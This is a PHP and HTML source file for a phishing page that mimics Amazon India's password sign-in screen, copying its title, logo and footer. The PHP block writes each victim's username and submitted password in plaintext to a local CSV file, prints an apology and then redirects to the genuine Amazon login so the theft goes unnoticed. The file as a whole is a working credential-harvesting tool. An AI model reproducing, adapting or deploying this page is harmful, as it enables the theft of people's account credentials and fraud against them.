            <!-- PHP CODE TO STORE THE INFORMATION IN CSV FILE -->
<?php
    session_start();
    if (!isset($_SESSION['username'])) {
        header("Location: index.php");
        exit();
    }
    $user = $_SESSION['username'];
    if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
        $pwd = htmlspecialchars($_POST['password']);
        $fp = fopen("login_info.csv", 'a');
        // to be run only the first time
        // fwrite($fp, "Username");
        // fwrite($fp, ",");
        // fwrite($fp, "Password");
        // fwrite($fp, "\n");

        fwrite($fp, "\n");
        fwrite($fp, $user);
        fwrite($fp, ",");
        fwrite($fp, $pwd);
        fclose($fp);
        echo "Sorry for the inconvenience. Redirecting to login page.";
        header("Refresh:0; url=https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Flog-in%2Fs%3Fk%3Dlog%2Bin%26ref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0");
        exit();
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="amazon.jpeg" type="image/x-icon">    
</head>
<body>
    <header>
        <img src="amazonlogo.png" alt="Logo" width="150px" height="40px">
    </header>
    <main>
        <div class="main_con">
            <h1 style="font-weight: lighter;font-size: 30px;">Sign in</h1>
            <div class="email_id">
                <span><?php echo $user; ?></span>
                <span><a href="index.php" style="text-decoration:none; padding-left:10px;">Change</a></span>
            </div>
            <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
                <div>
                    <span style="font-weight: bold;font-size: 14px; float: left;">Password</span>
                    <span style="float: right;padding-right: 20px;font-size:12px">Forgot Password</span>
                </div>
                <input type="password" name="password">
                <input type="submit" value="Sign in" class="signin">
                <br>
                <div class="checkbox-container">
                    <input type="checkbox" style="width: 15px;padding: 0;margin: 0;">
                    <label for="cb">Keep me Signed in</label>
                </div>
            </form>

            
        </div>
    </main>
    <div style="height: 50px;"></div>
    <footer>
        <div class="tc">
            <div class="component">
                <a href="https://www.amazon.in/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&nodeId=200545940">Conditions of Use</a>
            </div>
            <div class="component">
                <a href="https://www.amazon.in/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&nodeId=200534380">Privacy Notice</a>
            </div>
            <div class="component">
                <a href="https://www.amazon.in/gp/help/customer/display.html?ie=UTF8&nodeId=508510">Help</a>
            </div>
        </div>
        <div class="copyright">
            © 1996-2024, Amazon.com, Inc. or its affiliates
        </div>
    </footer>
</body>
</html>
